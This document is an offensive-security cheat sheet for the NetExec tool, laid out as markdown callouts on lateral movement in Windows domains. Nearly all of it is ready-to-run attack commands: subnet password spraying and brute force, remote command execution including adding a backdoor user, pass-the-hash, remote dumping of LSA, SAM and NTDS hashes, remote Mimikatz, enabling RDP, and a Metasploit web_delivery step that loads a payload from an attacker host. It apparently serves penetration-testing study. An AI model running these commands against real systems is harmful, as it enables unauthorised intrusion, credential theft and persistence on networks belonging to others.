
> [!abstract] NetExec (nxc) Cheat Sheet - Lateral Movement
> NetExec is the modern, community-maintained successor to CrackMapExec (CME). It is the ultimate swiss army knife for network exploitation, heavily used for Lateral Movement, Password Spraying, and Process Execution across Windows/Active Directory environments via SMB, WMI, and MSSQL.
> **MITRE ATT&CK Mapping:** [TA0008 Lateral Movement](https://attack.mitre.org/tactics/TA0008/)

## Installation

> [!info]+ Installing NetExec
> NetExec is pre-installed on modern Kali Linux. If you need to install or update it:
> ```bash
> # Install via apt (Recommended)
> sudo apt update && sudo apt install netexec -y
> 
> # Install via pipx (For latest dev versions)
> pipx install git+https://github.com/Pennyw0rth/NetExec
> ```

---

## Authentication & Initial Access

> [!danger]+ Password Spraying & Brute Force
> Before moving laterally, you need valid credentials. NetExec excels at password spraying across subnets.
> 
> **Local vs. Domain Authentication:**
> - Use `--local-auth` if the user is a local account on the target machine (e.g., Administrator).
> - Omit it if the user is a domain account.
> ```bash
> # Brute force with a password list (Local Auth)
> nxc smb 192.168.1.0/24 -u administrator -p /usr/share/wordlists/unix_passwords.txt --local-auth
> 
> # Password spray (One password, many users)
> nxc smb 192.168.1.0/24 -u users.txt -p 'Fall2023!' --continue-on-success
> ```

---

## Enumeration (Recon for Lateral Movement)

> [!tip]+ Network & Share Enumeration
> Identify targets, open shares, and user sessions to plan your lateral movement path.
> ```bash
> # Enumerate hosts where current user has local admin access
> nxc smb 192.168.1.0/24 -u user -p pass --local-auth
> 
> # List shared folders and check read/write access
> nxc smb 192.168.1.50 -u user -p pass --shares
> 
> # Enumerate logged on users (requires local admin)
> nxc smb 192.168.1.50 -u user -p pass --loggedon-users
> 
> # List domain users (Requires domain credentials, no local admin needed)
> nxc smb 192.168.1.50 -u user -p pass --users
> nxc smb 192.168.1.50 -u user -p pass --groups
> ```

---

## Process Execution (Lateral Movement)

> [!warning]+ Remote Command Execution
> Once valid credentials are obtained, you can execute commands on the remote target to move laterally. NetExec uses the `svcctl` Windows service (via SMB) or WMI to create and execute temporary processes.
> 
> **CMD Command Execution (`-x`):**
> ```bash
> # Runs standard CMD commands
> nxc smb x.x.x.x -u administrator -p 'pass123' -x 'whoami'
> nxc smb x.x.x.x -u administrator -p 'pass123' -x 'net user hacker Pass123 /add'
> ```
> 
> **PowerShell Command Execution (`-X`):**
> ```bash
> # Runs PowerShell commands
> nxc smb x.x.x.x -u administrator -p 'pass123' -X 'Get-Process'
> nxc smb x.x.x.x -u administrator -p 'pass123' -X 'hostname'
> ```
> 
> **WMI Execution (Alternative to SMB):**
> *Useful if SMB (port 445) is blocked by the firewall, but WMI (port 135) is open.*
> ```bash
> nxc wmi x.x.x.x -u administrator -p 'pass123' -x 'whoami'
> ```

---

## Pass-the-Hash (PtH)

> [!example]+ Lateral Movement using Hashes
> If you only have the NTLM hash (e.g., from LSASS dumping), NetExec allows you to authenticate and execute commands without knowing the plaintext password.
> ```bash
> # Authenticate using Hash and execute a command
> # Syntax: -H LMHASH:NTHASH (You can use 00000000000000000000000000000000 for LM)
> nxc smb x.x.x.x -u administrator -H 00000000000000000000000000000000:NTLM_HASH -x 'whoami'
> 
> # PtH via WMI
> nxc wmi x.x.x.x -u administrator -H 00000000000000000000000000000000:NTLM_HASH -x 'ipconfig'
> ```

---

## Credential Dumping

> [!bug]+ Extracting Secrets from Remote Targets
> If you have local admin privileges on the target, NetExec can remotely dump credentials from memory or registry.
> ```bash
> # Dump LSA secrets (often contains cached credentials)
> nxc smb x.x.x.x -u administrator -p 'pass123' --lsa
> 
> # Dump SAM database (local account hashes)
> nxc smb x.x.x.x -u administrator -p 'pass123' --sam
> 
> # Dump NTDS.dit (Domain Controller Hashes)
> nxc smb x.x.x.x -u administrator -p 'pass123' --ntds
> ```

---

## NetExec Modules & Payload Delivery

> [!success]+ Using Modules for Payload Delivery & Privilege Escalation
> NetExec allows executing custom scripts (modules) on the target. This is highly useful for delivering Metasploit payloads, running Mimikatz, or enabling features like RDP.
> 
> **List available modules:**
> ```bash
> nxc smb -L
> ```
> 
> **Metasploit Integration (web_delivery):**
> *Delivers a Metasploit payload directly into memory via SMB.*
> 1. Start Metasploit Web Delivery Handler:
> ```bash
> msfconsole -qx "use exploit/multi/script/web_delivery;set lhost <KALI_IP>;set lport 4444;set target 2;exploit"
> ```
> 2. Execute NetExec Module on the target:
> ```bash
> nxc smb x.x.x.x -u administrator -p 'pass123' -M web_delivery -o URL=http://<KALI_IP>/wdjghd
> ```
> 
> **Executing Mimikatz Remotely:**
> ```bash
> # Runs the mimikatz module on the target to dump credentials
> nxc smb x.x.x.x -u administrator -p 'pass123' -M mimikatz
> ```
> 
> **Enabling RDP Remotely (Privilege Escalation/Lateral Movement):**
> ```bash
> # Enable RDP service on the target
> nxc smb x.x.x.x -u administrator -p 'pass123' -M rdp -o ACTION=enable
> 
> # Connect to the target via RDP
> xfreerdp /u:administrator /p:pass123 /v:x.x.x.x
> ```

